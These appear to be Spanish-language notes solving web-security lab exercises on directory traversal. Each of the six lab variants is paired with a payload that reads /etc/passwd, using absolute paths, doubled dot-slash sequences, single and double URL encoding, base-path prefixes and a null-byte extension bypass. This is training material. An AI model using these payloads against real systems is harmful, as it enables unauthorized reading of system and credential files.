# Laboratorios de Directory Trasversal

## File path traversal, simple case

Obtener el archivo passwd cambiando la ruta de la imagen por la siguiente
> `../../../etc/passwd`

## File path traversal, traversal sequences blocked with absolute path bypass

Usar Rutas Absolutas
> `/etc/passwd`

## File path traversal, traversal sequences stripped non-recursively

Usar doble pleca en la ruta
> `....//....//....//etc/passwd`

## File path traversal, traversal sequences stripped with superfluous URL-decode

Ejemplos
- `%2e%2e%2f`
- `%252e%252e%252f`
- `..%c0%af`
- `..%ef%bc%8f`

bypass con URL encoding
> `..%252f..%252f..%252fetc/passwd`

## File path traversal, validation of start of path

Esperando direccion base por defecto
> `filename=/var/www/images/../../../etc/passwd`

## File path traversal, validation of file extension with null byte bypass

Esperando extensión de archivo en especifico
> `filename=../../../etc/passwd%00.png`
